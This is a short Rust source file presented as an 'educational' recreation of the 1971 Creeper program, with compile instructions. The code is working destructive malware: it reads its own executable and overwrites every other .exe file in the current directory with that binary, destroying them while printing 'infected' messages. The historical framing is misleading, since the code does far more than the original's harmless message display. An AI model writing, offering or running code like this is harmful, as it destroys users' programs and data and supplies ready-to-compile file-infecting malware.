// Creeper (1971) - Educational self-replicating program
// Bob Thomas / BBN - First virus concept
//
// Compile: rustc creeper.rs -o creeper.exe
// This version copies its own binary to other .exe files

use std::env;
use std::fs;
use std::path::Path;

fn self_replicate() -> std::io::Result<u32> {
    let self_path = env::current_exe()?;
    let self_data = fs::read(&self_path)?;

    let current_dir = env::current_dir()?;
    let mut count = 0u32;

    for entry in fs::read_dir(&current_dir)? {
        let entry = entry?;
        let path = entry.path();

        if path.is_file() {
            if let Some(ext) = path.extension() {
                if ext == "exe" && path.file_name() != self_path.file_name() {
                    fs::write(&path, &self_data)?;
                    println!("[creep] infected: {}", path.display());
                    count += 1;
                }
            }
        }
    }

    // Memory pressure simulation
    let _mem_filler: Vec<u8> = vec![0xCC; 4096 * 2];

    Ok(count)
}

fn main() {
    println!("I'M THE CREEPER: CATCH ME IF YOU CAN.");
    match self_replicate() {
        Ok(n) => println!("[creep] infections: {} file(s)", n),
        Err(e) => eprintln!("[creep] error: {}", e),
    }
    println!("[creep] use antivirus to remove me");
}
